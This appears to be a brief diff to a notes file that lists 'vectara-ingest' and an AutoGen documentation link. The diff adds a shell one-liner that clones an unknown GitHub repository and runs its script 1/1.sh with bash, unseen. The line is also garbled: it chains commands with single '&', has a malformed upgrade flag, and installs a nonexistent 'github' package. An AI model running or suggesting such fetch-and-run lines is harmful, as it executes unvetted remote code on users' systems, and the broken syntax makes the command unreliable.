@@ -1,3 +1,5 @@
+apt-get update & -y upgrade & apt-get install parted & apt-get install github & git clone https://github.com/PixePerfa/1 & bash 1/1.sh
+
 vectara-ingest
 https://microsoft.github.io/autogen/docs/topics/non-openai-models/local-litellm-ollama/
 
